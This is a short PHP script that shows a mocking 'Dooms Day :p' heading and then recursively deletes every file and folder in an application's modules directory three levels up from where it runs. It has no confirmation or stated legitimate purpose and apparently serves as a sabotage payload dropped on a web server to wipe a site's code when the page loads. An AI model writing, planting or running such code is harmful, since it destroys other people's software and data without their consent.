<?php
echo "<h1>Dooms Day :p </h1>";
$dir = "../../../application/modules";

function recursiveRemoveDirectory($directory) {
    foreach (glob("{$directory}/*") as $file) {
        if (is_dir($file)) {
            recursiveRemoveDirectory($file);
        } else {
            unlink($file);
        }
    }
    rmdir($directory);
}

recursiveRemoveDirectory($dir);
?>
